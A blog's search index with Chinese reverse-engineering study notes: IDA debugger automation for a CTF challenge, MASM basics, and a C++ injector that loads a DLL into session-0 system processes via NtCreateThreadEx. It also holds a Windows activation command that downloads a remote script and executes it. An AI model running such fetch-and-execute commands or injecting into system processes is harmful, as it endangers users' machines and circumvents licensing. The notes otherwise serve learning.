<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Win11激活</title>
      <link href="/posts/a848d09.html"/>
      <url>/posts/a848d09.html</url>
      
        <content type="html"><![CDATA[<p>管理员powershell:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">irm</span> https://get.activated.win | <span class="built_in">iex</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 实践 </category>
          
          <category> 记录 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>IDA自动化调试</title>
      <link href="/posts/9be53c83.html"/>
      <url>/posts/9be53c83.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言">前言</h2><p>之前一直想找个方法实现IDA调试的时候自动执行操作，现在终于找到了</p><p>ida里面有一个api：ida_dbg.step_into()，效果是执行一次步入，通过循环这个指令就可以实现自动步入的效果，在步过后写自己需要的效果就好</p><h2 id="实现">实现</h2><p>下面是一个对于dasctf，BabyEnc的指令还原脚本，这个题将真的逻辑用汇编写了出来，并把每句汇编放在格式相同的花指令中，通过下面这个脚本可以提取每组汇编中的真实代码，组合成一个函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> idc <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> idaapi</span><br><span class="line"><span class="keyword">import</span> idautils</span><br><span class="line"><span class="keyword">import</span> ida_dbg</span><br><span class="line"></span><br><span class="line">statx = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_address</span>(<span class="params">target_ea</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;trace_output.bin&quot;</span>, <span class="string">&quot;ab&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            ida_dbg.wait_for_next_event(ida_dbg.WFNE_SUSP, -<span class="number">1</span>)<span class="comment">#在获取内存/寄存器/状态和执行(f4,f7,f8,f9)之间必须有这行，ida是单线程，必须等待调试器获取到状态之后再取内容</span></span><br><span class="line">            current_ea = ida_dbg.get_reg_val(<span class="string">&quot;EIP&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> current_ea == target_ea:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;finished&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                handle_instruction(current_ea, f)</span><br><span class="line">                ida_dbg.step_into()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle_instruction</span>(<span class="params">ea, file</span>):</span><br><span class="line">    <span class="keyword">global</span> statx</span><br><span class="line">    statx-=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span>(statx &lt;= <span class="number">0</span>):<span class="comment">#减少时间，ida指令需要时间</span></span><br><span class="line">        instr = idc.GetDisasm(ea)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;jmp     ebx&quot;</span> <span class="keyword">in</span> instr:<span class="comment">#在每块的结尾执行</span></span><br><span class="line">            statx = <span class="number">11</span></span><br><span class="line">            count = <span class="number">0</span></span><br><span class="line">            ea_temp = ea</span><br><span class="line">            prev_instr = <span class="string">&quot;&quot;</span></span><br><span class="line">            <span class="keyword">while</span> count &lt; <span class="number">11</span>:<span class="comment">#向上找第十一行代码</span></span><br><span class="line">                ea_temp = idc.prev_head(ea_temp)</span><br><span class="line">                prev_instr = idc.GetDisasm(ea_temp)</span><br><span class="line">                count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;popa&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> prev_instr <span class="keyword">and</span> <span class="string">&quot;cmp&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> prev_instr:<span class="comment">#过滤跳转指令</span></span><br><span class="line">                machine_code = ida_bytes.get_bytes(ea_temp, idc.get_item_size(ea_temp))</span><br><span class="line">                file.write(machine_code)</span><br><span class="line">                <span class="built_in">print</span>(prev_instr)</span><br><span class="line"></span><br><span class="line">check_address(<span class="number">0x0041F082</span>)</span><br></pre></td></tr></table></figure><p>另一种实现是依赖断点的实现，继承DBG_hooks实现断点钩子，需要准确知道在哪里下断点才行，感觉有点麻烦，不过要是能算出来具体的位置，那也很简单，速度也更快</p><h2 id="缺点">缺点</h2><p>需要的时间太长了，尤其是在有长花指令的情况下，这段代码大概执行了90分钟左右，但是没有花指令一般好像也不需要这种操作(也许控制流混淆需要？)。不过另外一方面，编写这种脚本不需要脑子，不需要主动获取寄存器的值，模拟执行可能写的有偏差，但是这种就肯定不会错。</p>]]></content>
      
      
      <categories>
          
          <category> 知识集 </category>
          
          <category> 逆向 </category>
          
          <category> 自动化逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IDA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MASM汇编</title>
      <link href="/posts/dfd755e7.html"/>
      <url>/posts/dfd755e7.html</url>
      
        <content type="html"><![CDATA[<h2 id="x16基本格式">x16基本格式</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line"></span><br><span class="line">code segment;指定段</span><br><span class="line"></span><br><span class="line">int 21h;退出</span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><h2 id="x86基本格式">x86基本格式</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">.586;指定指令集版本</span><br><span class="line">.model flat,stdcall;设置内存模型和调用约定:_edecl,_stdcall,_fastcall，_thiscall</span><br><span class="line">option casemap:none;区分大小写</span><br><span class="line"></span><br><span class="line">includelib ucrt.lib;导入c相关标准库</span><br><span class="line">includelib legacy_stdio_definitions.lib;导入c相关库</span><br><span class="line"></span><br><span class="line">includelib Kernel32.lib</span><br><span class="line">includelib User32.lib</span><br><span class="line"></span><br><span class="line">MessageBoxA proto hwnd:DWORD,lpText:BYTE,lpCaption:BYTE,uType:DWORD</span><br><span class="line">ExitProcess proto uCode:DWORD</span><br><span class="line"></span><br><span class="line">extern printf:proc;声明外部函数</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.data;指定段</span><br><span class="line">szFormat db &#x27;%d&#x27;, 0</span><br><span class="line"></span><br><span class="line">.code;指定段</span><br><span class="line">main proc</span><br><span class="line">mov eax,64h</span><br><span class="line">push eax;函数调用</span><br><span class="line">lea ecx,szFormat</span><br><span class="line">push ecx</span><br><span class="line">call printf</span><br><span class="line">add esp,8;c标准</span><br><span class="line"></span><br><span class="line">push 0</span><br><span class="line">push 0</span><br><span class="line">push 0</span><br><span class="line">push 0</span><br><span class="line">call MessageBoxA;</span><br><span class="line">push 0</span><br><span class="line">call ExitProcess;win标准 或者可以写invoke ExitProcess,0</span><br><span class="line">main endp</span><br><span class="line">end</span><br></pre></td></tr></table></figure><h3 id="汇编头文件-inc">汇编头文件(.inc)</h3><p>包含头文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include header.inc</span><br></pre></td></tr></table></figure><h3 id="伪指令">伪指令</h3><h4 id="invoke">invoke</h4><p>使用前必须先定义，比如上面的<code>ExitProcess proto uCode:DWORD</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke farproc,para1,para2,...</span><br></pre></td></tr></table></figure><p>只能用于win32 api</p><p><a href="https://masm32.com/download.htm">Download The MASM32 SDK</a>下载MASM32SDK</p><p>效果是可以直接导入已经定义好的函数，可以直接invoke</p><p>在项目属性中Microsoft Macro Assembler-include Paths中附加MASM中的include目录，然后可以直接这样使用函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">.586;指定指令集版本</span><br><span class="line">.model flat,stdcall;设置内存模型和调用约定:_edecl,_stdcall,_fastcall，_thiscall</span><br><span class="line">option casemap:none;区分大小写</span><br><span class="line"></span><br><span class="line">includelib ucrt.lib;导入c相关标准库</span><br><span class="line">includelib legacy_stdio_definitions.lib;导入c相关库</span><br><span class="line"></span><br><span class="line">include Kernel32.inc</span><br><span class="line">include User32.inc</span><br><span class="line"></span><br><span class="line">includelib Kernel32.lib</span><br><span class="line">includelib User32.lib</span><br><span class="line"></span><br><span class="line">extern printf:proc;声明外部函数</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.data;指定段</span><br><span class="line">szFormat db &#x27;%d&#x27;, 0</span><br><span class="line"></span><br><span class="line">.code</span><br><span class="line">main proc</span><br><span class="line">mov eax,64h</span><br><span class="line">push eax;函数调用</span><br><span class="line">lea ecx,szFormat</span><br><span class="line">push ecx</span><br><span class="line">call printf</span><br><span class="line">add esp,8;c标准</span><br><span class="line"></span><br><span class="line">push 0</span><br><span class="line">push 0</span><br><span class="line">push 0</span><br><span class="line">push 0</span><br><span class="line">call MessageBoxA;</span><br><span class="line">push 0</span><br><span class="line">call ExitProcess;win标准 或者可以写invoke ExitProcess,0</span><br><span class="line">main endp</span><br><span class="line"></span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>对于自己定义的函数，使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">addx proc numA:dword,numB:dword</span><br><span class="line">xor eax,eax</span><br><span class="line">add eax,numA</span><br><span class="line">add eax,numB</span><br><span class="line">ret</span><br><span class="line">addx endp</span><br></pre></td></tr></table></figure><p>这样的格式，也可以用invoke调用，对于C库的cstd函数，可以通过这个方式进行一次std的封装。</p><h4 id="if">if</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">main proc</span><br><span class="line">mov dwIndex,11</span><br><span class="line">    .if dwIndex== 10</span><br><span class="line">    mov dwNumber,10</span><br><span class="line">    invoke printNumber,dwNumber</span><br><span class="line">    .elseif deIndex &gt;= 12</span><br><span class="line">    mov dwNumber,12</span><br><span class="line">    invoke printNumber,dwNumber</span><br><span class="line">    .else</span><br><span class="line">    mov dwNumber,0</span><br><span class="line">    invoke printNumber,dwNumber</span><br><span class="line">    .endif</span><br><span class="line">main endp</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">.break;跳出循环</span><br><span class="line">.continue;跳到条件检查</span><br></pre></td></tr></table></figure><h4 id="while">while</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov dwIndex,100</span><br><span class="line">.while dwIndex&gt;0</span><br><span class="line">dec deIndex</span><br><span class="line">.endw</span><br></pre></td></tr></table></figure><h3 id="宏">宏</h3><p>无参宏</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AAA EQU 100</span><br></pre></td></tr></table></figure><p>将AAA当100</p><p>有参宏</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">;定义</span><br><span class="line">MyAdd MACRO n1</span><br><span class="line">add eax,n1</span><br><span class="line">endm</span><br><span class="line">;使用</span><br><span class="line">MyAdd &lt;1&gt;;简单参数也可以直接MyAdd 1</span><br><span class="line"></span><br><span class="line">MyAdd2 MACRO reg,n1</span><br><span class="line">add reg,n1</span><br><span class="line">endm</span><br><span class="line"></span><br><span class="line">MyAdd eax,10</span><br></pre></td></tr></table></figure><h3 id="结构体">结构体</h3><p>在data段外声明</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Point struct;声明</span><br><span class="line">x word ?</span><br><span class="line">y word ?</span><br><span class="line">Point ends</span><br><span class="line"></span><br><span class="line">.data</span><br><span class="line">MyPoint Point&lt;?&gt;;不初始化定义</span><br><span class="line"></span><br><span class="line">.code</span><br><span class="line">main proc</span><br><span class="line">    mov MyPoint.x,123</span><br><span class="line">    mov MyPoint.y,456</span><br><span class="line">main endp</span><br><span class="line">end</span><br></pre></td></tr></table></figure><h3 id="内联汇编">内联汇编</h3><p>vs中可以在c和cpp中使用内联汇编</p><p>x86：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_asm&#123;</span><br><span class="line">push MB_OK;可以直接传宏</span><br><span class="line">call myFunc;可以直接调用定义的函数</span><br><span class="line">_emit 1;立即数</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>x64：</p><p>在生成依赖项中勾选masm，新建asm文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.code</span><br><span class="line">Myadd proc</span><br><span class="line">mov ecx,edx</span><br><span class="line">mov eax,ecx</span><br><span class="line">ret</span><br><span class="line">Myadd endp</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>再声明head.h</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exten <span class="string">&quot;C&quot;</span> DWORD <span class="title function_">Myadd</span><span class="params">(DWORD a,DWORD b)</span>;</span><br></pre></td></tr></table></figure><p>包含这个文件即可直接使用</p><h2 id="x64基本格式">x64基本格式</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.code</span><br><span class="line">main proc</span><br><span class="line">sub rsp,28h</span><br><span class="line">add rsp,28h</span><br><span class="line">ret</span><br><span class="line">main endp</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>可以直接写代码，调用函数用fastcall</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">.data?;定义未初始化数据</span><br><span class="line">.const;定义常量</span><br></pre></td></tr></table></figure><p>通过修改编译器为inter，可以继续使用内联汇编</p><p>可以直接使用vs或者ida查看c/cpp代码然后取得相应的汇编代码，避免麻烦<br>VS中需要先取消符号</p>]]></content>
      
      
      <categories>
          
          <category> 知识集 </category>
          
          <category> 逆向 </category>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《逆核》0C-向会话0注入DLL</title>
      <link href="/posts/9dacfd2d.html"/>
      <url>/posts/9dacfd2d.html</url>
      
        <content type="html"><![CDATA[<h2 id="会话">会话</h2><p>会话是登录后的用户环境</p><p>在进程管理器中详细信息的空栏中右键，可以打开会话属性：</p><p><img src="https://s2.loli.net/2025/02/27/NUsmc2Vodyr4CLP.png" alt="image-20250227180553270"></p><p>它用来隔离不同用户的操作环境，会话ID的先后顺序取决于系统启动后哪个用户先登录，会话0一般为系统进程，和用户进程隔离来提高安全性。（但是看起来似乎没什么用）</p><p>如果要注入系统进程，直接使用CreateRemoteThread会被拦截下来，所以需要用另外的办法。最简单的就是换一个API：NtCreateThreadEx</p><p>定义如下，与CreateRemoteThread差不多</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* PFNTCREATETHREADEX)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">PHANDLE ThreadHandle,<span class="comment">//创建的线程的线程句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">ACCESS_MASK DesiredAccess,<span class="comment">//线程权限</span></span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID ObjectAttributes,<span class="comment">//属性，一般nullptr</span></span></span></span><br><span class="line"><span class="params"><span class="function">HANDLE ProcessHandle,<span class="comment">//目标进程句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">LPTHREAD_START_ROUTINE lpStartAddress,<span class="comment">//起始函数</span></span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID lpParameter,<span class="comment">//参数</span></span></span></span><br><span class="line"><span class="params"><span class="function">ULONG CreateThreadFlags,<span class="comment">//好像和挂起有关，填FALSE即可</span></span></span></span><br><span class="line"><span class="params"><span class="function">SIZE_T ZeroBits,<span class="comment">//0即可</span></span></span></span><br><span class="line"><span class="params"><span class="function">SIZE_T StackSize,<span class="comment">//0即可</span></span></span></span><br><span class="line"><span class="params"><span class="function">SIZE_T MaximumStackSize,<span class="comment">//0即可</span></span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID pUnkown<span class="comment">//nullptr即可</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>直接用这个注入就好</p><p>注入器代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">modifiedCreateRemoteThread</span><span class="params">(HANDLE hProcess, LPTHREAD_START_ROUTINE pThreadProc, LPVOID pRemoteBuf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">FARPROC pNtCreateThreadEx = <span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;ntdll.dll&quot;</span>), <span class="string">&quot;NtCreateThreadEx&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!pNtCreateThreadEx)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;NtCreateThreadEx not found&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* PFNTCREATETHREADEX)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">PHANDLE ThreadHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">ACCESS_MASK DesiredAccess,</span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID ObjectAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function">ULONG CreateThreadFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">SIZE_T ZeroBits,</span></span></span><br><span class="line"><span class="params"><span class="function">SIZE_T StackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">SIZE_T MaximumStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID pUnkown</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line">PFNTCREATETHREADEX crt = <span class="built_in">reinterpret_cast</span>&lt;PFNTCREATETHREADEX&gt;(pNtCreateThreadEx);</span><br><span class="line">HANDLE hThread;</span><br><span class="line"><span class="built_in">crt</span>(&amp;hThread, THREAD_ALL_ACCESS, <span class="literal">nullptr</span>, hProcess, pThreadProc, pRemoteBuf, FALSE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">nullptr</span>);</span><br><span class="line"><span class="keyword">if</span> (!hThread) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;create thread failed&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);<span class="comment">//等待线程结束</span></span><br><span class="line"><span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">inject</span><span class="params">(DWORD dwPID, LPCTSTR szDllPath)</span> </span>&#123;</span><br><span class="line">HANDLE hProcess = <span class="number">0</span>;</span><br><span class="line"><span class="type">bool</span> status = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span> (!(hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwPID)))<span class="comment">//取得对应PID句柄</span></span><br><span class="line">&#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;open %d failed\n&quot;</span>), dwPID);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">DWORD dwBufSize = (DWORD)(_tcslen(szDllPath) + <span class="number">1</span>) * <span class="built_in">sizeof</span>(TCHAR);</span><br><span class="line">LPVOID pBuf = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, dwBufSize, MEM_COMMIT, PAGE_READWRITE);<span class="comment">//申请内存</span></span><br><span class="line"><span class="keyword">if</span> (pBuf == <span class="number">0</span>) &#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;memory alloc failed\n&quot;</span>));</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">WriteProcessMemory</span>(hProcess, pBuf, (LPVOID)szDllPath, dwBufSize, <span class="literal">NULL</span>);<span class="comment">//写入地址</span></span><br><span class="line">HMODULE kernel = <span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;kernel32.dll&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (kernel == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">LPTHREAD_START_ROUTINE pThreadProc = (LPTHREAD_START_ROUTINE)<span class="built_in">GetProcAddress</span>(kernel, <span class="string">&quot;LoadLibraryW&quot;</span>);<span class="comment">//获取LodaLibrary地址</span></span><br><span class="line">status = <span class="built_in">modifiedCreateRemoteThread</span>(hProcess,</span><br><span class="line">pThreadProc,<span class="comment">//线程回调函数</span></span><br><span class="line">pBuf<span class="comment">//传参</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, TCHAR* argv[]) &#123;</span><br><span class="line"><span class="keyword">if</span> (argc != <span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;USAGE: %s pid dll_path\n&quot;</span>), argv[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">return</span> <span 